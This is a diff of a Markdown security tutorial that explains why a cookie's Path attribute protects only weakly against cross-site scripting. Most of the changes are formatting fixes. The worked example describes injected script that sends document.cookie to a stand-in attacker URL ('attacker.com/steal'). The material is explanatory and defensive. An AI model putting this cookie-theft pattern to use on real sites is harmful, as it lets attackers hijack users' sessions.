@@ -138,7 +138,8 @@
 
  * Example for limited protection against cross-site-scripting attacks.
 
-   Consider a website where users can post comments. The website sets a session cookie with a specific Path attribute ("/user") upon user login.
+   Consider a website where users can post comments. The website sets a session cookie with a specific Path attribute ("/user") upon 
+user login.
 
    **Set-Cookie: sessionId=123; Path=/user*
    
@@ -147,14 +148,14 @@
 
  * Insecure html page
 
-<kbd><img src="screenshots/insecure_html.png" width="700" ></kbd>
+<kbd><img src="screenshots/insecure_html.PNG" width="700" ></kbd>
 
  * Example futher explained.
 
--The server tries to restrict access to pages under the "/user" path by setting the sessionId cookie with a Path attribute of "/user". 
--Then the attacker injects a script into a different page (insecure.html) that runs in the user's browser. This script accesses the document.cookie property, which includes all accessible cookies, regardless of the Path attribute.
--The image object created byy the inected script appends the user's cookie to the image URL. This URL points to a server controlled by the attacker **(https://attacker.com/steal?cookie= + document.cookie)* .
--When the user visits the insecure.html page, the injected script runs, sending the user's session cookie to the attacker's server.
+- The server tries to restrict access to pages under the "/user" path by setting the sessionId cookie with a Path attribute of "/user". 
+- Then the attacker injects a script into a different page (insecure.html) that runs in the user's browser. This script accesses the document.cookie property, which includes all accessible cookies, regardless of the Path attribute.
+- The image object created byy the inected script appends the user's cookie to the image URL. This URL points to a server controlled by the attacker **(https://attacker.com/steal?cookie= + document.cookie)* .
+- When the user visits the insecure.html page, the injected script runs, sending the user's session cookie to the attacker's server.
 
   
  ### How a parent page can steal cookies from an iframed page if only the Path attribute is used in Set-Cookie.
